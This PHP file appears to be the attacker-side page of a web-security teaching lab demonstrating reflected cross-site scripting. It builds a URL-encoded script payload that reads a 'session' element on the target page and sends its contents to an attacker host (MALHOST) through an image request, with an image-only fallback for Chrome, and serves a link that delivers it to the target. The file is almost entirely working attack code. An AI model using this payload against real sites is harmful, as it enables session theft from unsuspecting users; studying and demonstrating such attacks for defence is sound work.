<?php
include('../declare.php');

// Chrome is smart enough to block the reflected JavaScript.
$ua = $_SERVER['HTTP_USER_AGENT'];
if (strpos($ua, 'Chrome') > -1) {
  // So just inject an image.
  $value = urlencode("<img src='".MALHOST."images/attack.png' />");
} else {
  $value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALHOST."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Malicious server prototype: Reflected XSS</title>
</head>
<body>
<h1>Reflected XSS</h1>
CLICK HERE for reflected XSS: <a href="<?=TGTHOST?>reflected/target?value=<?=$value?>">attack</a>
<br/>
<br/>
<br/>
<a href="<?=TGTHOST?>reflected/start">reflected XSS start</a> |
<a href="<?=TGTHOST?>home">target server home</a>
</body>
</html>

